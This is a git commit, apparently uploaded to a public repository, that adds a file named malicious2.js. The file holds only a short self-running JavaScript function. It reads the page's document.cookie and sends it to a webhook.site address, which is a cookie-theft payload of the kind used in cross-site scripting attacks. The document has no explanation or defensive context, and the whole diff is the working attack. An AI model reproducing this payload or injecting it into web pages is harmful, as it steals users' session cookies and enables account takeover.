2c96fc8fded0b6c5b7a14972d14a262dee3690aa
Jasper-LiEs <lijasper012@gmail.com>
2024-02-21 16:23:26 +0800

    Add files via upload

---
+++ malicious2.js
@@ -0,0 +1,5 @@
+(function() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://webhook.site/a1a42fea-588b-4dcc-9f00-f52c22c8c97d?cookies=" + encodeURIComponent(document.cookie), true);
+    xhr.send();
+})();
